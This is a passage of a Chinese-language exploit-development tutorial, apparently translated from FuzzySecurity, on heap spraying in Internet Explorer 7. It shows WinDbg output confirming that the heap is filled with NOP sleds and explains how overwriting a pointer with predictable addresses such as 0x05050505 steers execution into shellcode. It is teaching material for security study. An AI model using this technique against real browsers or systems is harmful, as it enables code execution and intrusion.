下面是最终的堆喷射脚本(公开的漏洞利用脚本，在所有IE7以下的版本测试结果一致。
这个脚本喷射更大的内存块
0x4000(=262144字节=0.25mb)，重复喷喷射500次(=125mb)。考虑到我们的shellcode不太会大于1000字节，这意味着我们有99.997%的概率命中NOP’s。这样使得堆喷射更稳定。让我们在Windbg观察堆喷射：
    0:014> s -a 0x00000000 L?7fffffff "FuzzySecurity"
    02a34010  46 75 7a 7a 79 53 65 63-75 72 69 74 79 0d 0a 20  FuzzySecurity.. 
    030ca75c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    03b4ffee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    03c6ffee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    03cfffee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    03d8ffee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    03e1ffee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    03eaffee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    03f3ffee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    [...Snip...]
    1521ffee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    152affee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    1533ffee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    153cffee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    1545ffee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    154effee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
    1557ffee  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 00 00  FuzzySecurity...
!peb看看默认的进程堆是哪个 (我们分配的字符串将会保存在默认进程堆)。
另外你可以执行"!heap -stat" 看看已经提交的字节数  
    0:014> !peb
    PEB at 7ffd8000
        InheritedAddressSpace:    No
        ReadImageFileExecOptions: No
        BeingDebugged:            Yes
        ImageBaseAddress:         00400000
        Ldr                       00251e90
        Ldr.Initialized:          Yes
        Ldr.InInitializationOrderModuleList: 00251f28 . 002557d8
        Ldr.InLoadOrderModuleList:           00251ec0 . 00255918
        Ldr.InMemoryOrderModuleList:         00251ec8 . 00255920
                Base TimeStamp                     Module
              400000 46c108d9 Aug 14 09:43:53 2007 C:Program FilesUtilu IE CollectionIE700iexplore.exe
            7c900000 4d00f29d Dec 09 23:15:41 2010 C:WINDOWSsystem32ntdll.dll
            7c800000 49c4f2bb Mar 21 21:59:23 2009 C:WINDOWSsystem32kernel32.dll
            77dd0000 49900be3 Feb 09 18:56:35 2009 C:WINDOWSsystem32ADVAPI32.dll
            77e70000 4c68fa30 Aug 16 16:43:28 2010 C:WINDOWSsystem32RPCRT4.dll
    [...Snip...]
            767f0000 4c2b375b Jun 30 20:23:55 2010 C:WINDOWSsystem32schannel.dll
            77c70000 4aaa5b06 Sep 11 22:13:26 2009 C:WINDOWSsystem32msv1_0.dll
            76790000 4802a0d9 Apr 14 08:10:01 2008 C:WINDOWSsystem32cryptdll.dll
            76d60000 4802a0d0 Apr 14 08:09:52 2008 C:WINDOWSsystem32iphlpapi.dll
        SubSystemData:     00000000
        ProcessHeap:       00150000
        ProcessParameters: 00020000
        CurrentDirectory:  'C:Documents and SettingsAdministratorDesktop'
        WindowTitle:  'C:Program FilesUtilu IE CollectionIE700iexplore.exe'
        ImageFile:    'C:Program FilesUtilu IE CollectionIE700iexplore.exe'
        CommandLine:  'about:home'
    [...Snip...]
让我们打印堆分配数据，我们可以看到98.63% 堆块正在使用：
    0:014> !heap -stat -h 00150000
     heap @ 00150000
    group-by: TOTSIZE max-display: 20
        size     #blocks     total     ( %) (percent of total busy bytes)
        7ffe0 1f4 - f9fc180  (98.63)
        3fff8 3 - bffe8  (0.30)
        1fff8 4 - 7ffe0  (0.20)
        7ffd0 1 - 7ffd0  (0.20)
        7ff8 b - 57fa8  (0.14)
        fff8 5 - 4ffd8  (0.12)
        1ff8 21 - 41ef8  (0.10)
        3ff8 d - 33f98  (0.08)
        ff8 f - ef88  (0.02)
        7f8 18 - bf40  (0.02)
        8fc1 1 - 8fc1  (0.01)
        7fe0 1 - 7fe0  (0.01)
        7fd0 1 - 7fd0  (0.01)
        7db4 1 - 7db4  (0.01)
        614 14 - 7990  (0.01)
        57e0 1 - 57e0  (0.01)
        20 208 - 4100  (0.01)
        5e4 b - 40cc  (0.01)
        4e4 c - 3ab0  (0.01)
        3980 1 - 3980  (0.01)
    我们列出大小为0x7ffe0的块
    0:014> !heap -flt s 7ffe0
        _HEAP @ 150000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            03ad0018 fffc 0000  [0b]   03ad0020    7ffe0 - (busy VirtualAlloc)
            03bf0018 fffc fffc  [0b]   03bf0020    7ffe0 - (busy VirtualAlloc)
            03c80018 fffc fffc  [0b]   03c80020    7ffe0 - (busy VirtualAlloc)
            03d10018 fffc fffc  [0b]   03d10020    7ffe0 - (busy VirtualAlloc)
            03da0018 fffc fffc  [0b]   03da0020    7ffe0 - (busy VirtualAlloc)
            03e30018 fffc fffc  [0b]   03e30020    7ffe0 - (busy VirtualAlloc)
            03ec0018 fffc fffc  [0b]   03ec0020    7ffe0 - (busy VirtualAlloc)
            03f50018 fffc fffc  [0b]   03f50020    7ffe0 - (busy VirtualAlloc)
    [...Snip...]
            15110018 fffc fffc  [0b]   15110020    7ffe0 - (busy VirtualAlloc)
            151a0018 fffc fffc  [0b]   151a0020    7ffe0 - (busy VirtualAlloc)
            15230018 fffc fffc  [0b]   15230020    7ffe0 - (busy VirtualAlloc)
            152c0018 fffc fffc  [0b]   152c0020    7ffe0 - (busy VirtualAlloc)
            15350018 fffc fffc  [0b]   15350020    7ffe0 - (busy VirtualAlloc)
            153e0018 fffc fffc  [0b]   153e0020    7ffe0 - (busy VirtualAlloc)
            15470018 fffc fffc  [0b]   15470020    7ffe0 - (busy VirtualAlloc)
            15500018 fffc fffc  [0b]   15500020    7ffe0 - (busy VirtualAlloc)
现在你可能会问告诉你自己：”这很酷,
但是有什么意义呢?”。一般上如果我们有写任意4字节漏洞。为了可靠，我们从来不会用shellcode地址直接覆写指针(例如EIP)。在堆喷射中我们可以决定堆布局。我们可以在堆中布置NOP’s+shellcode块。由于某个可预测的地址会指向NOP’s，所以我们可以用这个地址去覆写，一旦程序能执行到NOP’s，shellcode也会得到执行。下面是通常我们使用的可预测地址，在调试器看看这些地址的内容。可预测的地址：
    - 0x05050505
    - 0x06060606